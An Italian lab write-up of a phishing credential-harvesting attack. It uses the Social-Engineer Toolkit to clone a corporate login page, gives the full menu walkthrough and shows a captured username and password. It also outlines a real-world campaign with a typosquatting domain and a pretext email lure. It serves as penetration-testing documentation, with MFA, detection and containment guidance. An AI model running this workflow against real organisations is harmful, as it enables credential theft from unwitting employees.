> [English](README.en.md) | **Italiano**

# SET Website Attack Vectors: Credential Harvester via Site Cloning

> - **Fase:** Social Engineering - Website Attack Vectors - Credential Harvesting
> - **Visibilita:** Media - il web server locale genera traffico HTTP; URL anomalo visibile nella barra del browser se l'utente presta attenzione; nessun payload su disco, nessun alert AV
> - **Prerequisiti:** SET installato su Kali Linux (`sudo apt install set`); porta 80 disponibile sull'attaccante; URL della pagina di login target accessibile per la clonazione; rete condivisa o DNS spoofing per redirigere la vittima
> - **Output:** Finding SE-003 (severity Alto); credenziali utente catturate in chiaro nella console SET; redirect trasparente della vittima al sito reale

- **Ambiente Operativo:** Kali Linux (Attaccante 192.168.0.110), Windows 10 VM (Vittima 192.168.0.120)
- **Target:** Pagina login portale aziendale (`https://portal.company-lab.local/login`)
- **Framework:** Social-Engineer Toolkit (SET)
- **Tecnica Documentata:** Credential Harvester Attack Method - Site Cloner

---

## Executive Summary

Il Credential Harvester e il vettore piu utilizzato all'interno di SET per campagne di social engineering mirate. La tecnica consiste nella clonazione automatica di una pagina di login legittima e nel suo hosting su un web server controllato dall'attaccante. Quando la vittima inserisce le proprie credenziali nella pagina clonata, SET intercetta la richiesta POST, cattura username e password in chiaro, e redirige trasparentemente l'utente verso il sito reale.

L'efficacia di questa tecnica si basa sul fattore umano: la pagina clonata e visivamente identica all'originale, e in uno scenario reale l'URL viene mascherato tramite tecniche complementari (typosquatting, DNS spoofing, link shortener). Nel laboratorio e stata clonata una pagina di login aziendale e le credenziali dell'utente target sono state catturate con successo al primo tentativo.

---

## Finding SE-003: Credential Harvesting via Pagina Login Clonata

**ID Finding:** `SE-003` | **Severity:** `Alto` | **CVSS:** 7.5

Un attaccante puo clonare qualsiasi pagina di login accessibile pubblicamente e catturare le credenziali inserite dagli utenti. La tecnica non richiede exploit software: si basa interamente sulla fiducia dell'utente nell'aspetto visivo della pagina. Le credenziali vengono trasmesse in chiaro alla console dell'attaccante.

**Scenario PoC:** L'analista clona la pagina di login del portale aziendale di laboratorio e attende che la vittima (simulata sulla VM Windows) acceda all'URL dell'attaccante. Le credenziali inserite vengono catturate in tempo reale.

### PoC - Fase 1: Avvio SET e Configurazione Site Cloner

SET viene avviato con privilegi root (necessari per il binding sulla porta 80). La navigazione del menu interattivo segue il percorso: Social-Engineering Attacks, Website Attack Vectors, Credential Harvester Attack Method, Site Cloner.

```Bash
sudo setoolkit
```

```
         ___________      __
        / ____/ ___/___  / /_
       / __/  \__ \/ _ \/ __/
      / /___ ___/ /  __/ /_
     /_____//____/\___/\__/

[---]        The Social-Engineer Toolkit (SET)        [---]
[---]        Created by: David Kennedy (ReL1K)        [---]
[---]                 Version: 8.0.4                  [---]

 Select from the menu:

   1) Social-Engineering Attacks                      <--
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
  99) Exit the Social-Engineer Toolkit

set> 1
```

```
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors                          <--
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   ...

set> 2
```

```
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method              <--
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method

set:webattack> 3
```

```
   1) Web Templates
   2) Site Cloner                                     <--
   3) Custom Import

set:webattack> 2

[-] Credential harvester will be listening on port 80
[-] Enter the IP address for POST back (attacker): 192.168.0.110    <--
[-] Enter the URL to clone: https://portal.company-lab.local/login   <--

[*] Cloning the website: https://portal.company-lab.local/login
[*] This could take a moment...

[*] The site has been successfully cloned.                           <--
[*] Credential Harvester is now listening on 0.0.0.0:80
[*] Information will be displayed to you as it arrives.
```

### PoC - Fase 2: Vittima Accede alla Pagina Clonata

La vittima (VM Windows) naviga verso `http://192.168.0.110` - in un engagement reale l'URL sarebbe mascherato tramite typosquatting (es. `portal-company-lab.local`) o link shortener. La pagina appare identica al portale di login legittimo.

### PoC - Fase 3: Cattura delle Credenziali

Quando la vittima inserisce le credenziali e preme il pulsante di login, SET intercetta la richiesta POST e visualizza i dati catturati nella console dell'attaccante.

```
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: username=m.rossi@company-lab.local   <--
POSSIBLE PASSWORD FIELD FOUND: password=Pr0gett0_2026!              <--
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

[*] Redirecting victim to: https://portal.company-lab.local/login   <--
```

Le credenziali `m.rossi@company-lab.local` / `Pr0gett0_2026!` sono state catturate in chiaro. La vittima viene automaticamente redirezionata al sito reale, dove il login funzionera normalmente - l'utente percepisce solo un leggero ritardo, senza sospettare la compromissione.

---

## Impatto e Remediation (Blue Team)

La cattura di credenziali valide tramite pagina clonata consente all'attaccante l'accesso diretto ai sistemi aziendali con i privilegi dell'utente compromesso. Se le credenziali sono riutilizzate su piu servizi (pattern comune), l'impatto si estende a tutta la superficie esposta.

### Contromisure raccomandate

1. **Multi-Factor Authentication (MFA):** anche con credenziali compromesse, l'MFA impedisce l'accesso senza il secondo fattore. FIDO2/WebAuthn e resistente al phishing perche verifica il dominio di origine.
2. **URL Filtering e DNS Monitoring:** proxy aziendali con categorizzazione URL bloccano domini typosquatting noti; il monitoraggio DNS rileva risoluzioni anomale verso IP esterni.
3. **Security Awareness Training:** formazione ricorrente con simulazioni di phishing (GoPhish) per insegnare la verifica dell'URL prima dell'inserimento credenziali.
4. **Browser Security Features:** abilitare avvisi per siti non HTTPS; adottare password manager che compilano i campi solo sul dominio corretto (anti-phishing nativo).
5. **DMARC/DKIM/SPF:** se l'URL viene consegnato via email, le policy di autenticazione email riducono la probabilita di delivery.

---

## Esperienza di Laboratorio

L'ambiente di test e stato configurato con Kali Linux (192.168.0.110) come attaccante e una VM Windows 10 (192.168.0.120) come vittima, entrambe sulla stessa rete Bridge VirtualBox. SET e stato installato dal repository Kali (`sudo apt install set`) senza problemi.

La clonazione della pagina e avvenuta in pochi secondi: SET utilizza internamente `urllib` per scaricare l'HTML del target, inclusi CSS e JavaScript inline, e li ripubblica su un web server Python integrato. La pagina clonata era visivamente identica all'originale, inclusi loghi, colori e layout. L'unica differenza - l'URL nella barra del browser - e il punto critico su cui si basa tutta la difesa: un utente attento noterebbe l'IP numerico al posto del dominio aziendale.

Il primo tentativo ha richiesto un troubleshooting sulla porta 80: Apache2 era attivo di default su Kali e occupava la porta. Il comando `sudo systemctl stop apache2` ha risolto il conflitto. Questa e una situazione comune che l'analista deve anticipare in un engagement.

Le credenziali sono state catturate istantaneamente al submit del form. La redirect verso il sito reale e stata trasparente - la vittima avrebbe percepito solo un breve "flash" della pagina. In un engagement reale, questa transizione e virtualmente invisibile su connessioni veloci.

Un aspetto non ovvio emerso dal laboratorio: SET cattura tutti i campi POST, non solo username e password. Se il form include token CSRF, campi hidden o parametri aggiuntivi, SET li registra tutti. Questo puo fornire informazioni aggiuntive sulla struttura dell'applicazione target.

---

## Analisi Teorica: Perche il Credential Harvesting Funziona

Il credential harvesting via site cloning sfrutta tre bias cognitivi documentati nella letteratura di social engineering:

1. **Visual Trust:** gli utenti associano la legittimita di un sito al suo aspetto visivo (loghi, colori, layout) piuttosto che alla verifica dell'URL. Studi di Dhamija et al. (2006) hanno dimostrato che il 90% degli utenti non verifica il dominio nella barra degli indirizzi.

2. **Urgency Bias:** in uno scenario reale, l'URL di phishing viene tipicamente consegnato in un contesto di urgenza ("la tua password scade tra 24 ore", "accesso non autorizzato rilevato") che riduce ulteriormente l'attenzione critica.

3. **Expectation Confirmation:** se l'utente si aspetta di dover inserire le credenziali (es. ha ricevuto un'email che lo invita ad accedere), la pagina di login clonata conferma la sua aspettativa e non genera sospetti.

Dal punto di vista tecnico, la clonazione funziona perche le pagine di login sono tipicamente semplici (form HTML con pochi campi) e non implementano protezioni anti-cloning efficaci. Le difese server-side (CORS, Content Security Policy) proteggono il sito originale ma non impediscono la creazione di una replica statica. L'unica difesa efficace a livello di protocollo e FIDO2/WebAuthn, che vincola l'autenticazione al dominio specifico - una credenziale WebAuthn creata per `portal.company-lab.local` non funziona su `192.168.0.110`.

Nella kill chain, il credential harvesting si colloca nella fase di Initial Access: le credenziali catturate vengono immediatamente utilizzate per l'accesso diretto ai sistemi target, senza necessita di exploit software o escalation di privilegi.

---

## Scenario Reale: Campagna di Credential Harvesting Aziendale

> Questa sezione descrive come SE-003 si inserirebbe in un engagement reale contro un'organizzazione target.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** ricognizione OSINT completata; dominio aziendale e portale di login identificati; lista di email dipendenti ottenuta da LinkedIn/Hunter.io; dominio typosquatting registrato (es. `portal-company-Iab.local` con la "l" sostituita da "I" maiuscola).

**Kill Chain proiettata:**

```
OSINT: email dipendenti + URL portale login
        |
        v
Registrazione dominio typosquatting + certificato Let's Encrypt
        |
        v
SE-003: SET site cloner su VPS con dominio typosquatting
        |
        v
Email pretexting: "Aggiornamento policy - accedi per confermare"
        |
        v
Vittima accede -> credenziali catturate -> redirect al sito reale
        |
        v
Accesso VPN/OWA/SSO con credenziali -> Initial Access
        |
        v
Lateral Movement -> Privilege Escalation -> Domain Compromise
```

**Impatto potenziale:** con le credenziali di un singolo dipendente, l'attaccante accede alla rete aziendale via VPN o al sistema email via OWA. Se l'account compromesso ha privilegi IT, l'escalation verso il Domain Admin puo avvenire in ore.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** monitoraggio dei login su VPN/SSO per accessi da IP/geolocalizzazione anomali; alert su Certificate Transparency logs per domini simili al proprio; monitoraggio DNS per risoluzioni verso domini typosquatting noti.

**Indicatori di Compromissione (IOC):**
- Registrazione di domini visivamente simili al dominio aziendale (typosquatting)
- Email con link a domini esterni che imitano l'URL del portale interno
- Login da IP non associati alla posizione geografica dell'utente
- Login multipli con lo stesso account da IP diversi in finestra temporale breve

**Contenimento:** reset immediato della password dell'account compromesso; revoca token di sessione attivi; verifica degli accessi effettuati con le credenziali compromesse nelle ultime 48 ore; notifica all'utente con istruzioni per la verifica di attivita anomale.

**Eradicazione e hardening:**
- Implementazione MFA obbligatorio (FIDO2/WebAuthn per resistenza al phishing)
- Registrazione preventiva di varianti typosquatting del dominio aziendale
- Deploy di phishing simulation trimestrale con reportistica ai responsabili di area
- Configurazione browser aziendali con avvisi per siti non presenti nella whitelist

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Utilizzo di SET per la clonazione automatica della pagina di login e hosting del credential harvester. |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | Invio di link alla pagina clonata tramite email pretexting o canali di comunicazione del target. |
| Execution | User Execution: Malicious Link | `T1204.001` | La vittima naviga volontariamente verso l'URL della pagina clonata e inserisce le proprie credenziali. |
| Credential Access | Input Capture: Web Portal Capture | `T1056.003` | SET cattura le credenziali trasmesse via POST dalla pagina di login clonata. |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata). La pagina clonata e stata servita esclusivamente sulla rete locale di laboratorio. Nessuna pagina di phishing e stata esposta su Internet o indirizzata a utenti reali.
